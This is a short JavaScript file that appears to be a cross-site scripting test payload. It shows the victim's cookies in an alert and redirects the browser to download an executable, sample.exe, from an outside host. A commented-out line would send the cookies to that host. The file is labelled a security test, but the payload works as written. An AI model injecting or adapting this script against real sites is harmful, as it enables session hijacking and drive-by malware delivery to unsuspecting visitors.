alert("XSS TEST");
alert(document.cookie);

document.location.href="https://ninzacode.github.io/SECURITY_TEST/sample.exe";
//document.location.href="https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+encodeURIComponent(document.cookie);
